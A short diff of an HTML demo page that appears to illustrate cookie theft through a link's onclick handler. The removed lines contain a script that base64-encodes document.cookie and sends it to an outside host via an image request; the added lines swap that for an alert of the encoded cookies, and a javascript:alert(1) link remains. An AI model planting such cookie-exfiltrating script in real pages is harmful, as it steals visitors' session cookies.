@@ -6,15 +6,17 @@ i<!DOCTYPE html>
 </head>
 <body>
 	
-		<a href="javascript:alert(1)"<img src="http://www.html.am/images/html-codes/links/boracay-white-beach-sunset-300x225.jpg" width="300" height="225" alt="Photo of White Beach in Boracay, Philippines" onclick="myFunction()"/> 
+		<a href="javascript:alert(1)" onclick="myFunction()">
+
+			<img border="0" alt="W3Schools" src="http://www.html.am/images/html-codes/links/boracay-white-beach-sunset-300x225.jpg" width="300" height="225">
+		</a>	 
 
 	
 
 <script>
 	function myFunction() {
 		  var base64_cookies=base64(document.cookie);
-    		   var img=new Image();
-		  img.src="https://getcookie.github.io/csrfdemo/index.html +"/"+ base64_cookies"
+    		   window.alert(base64_cookies);
 
 }
 </script>
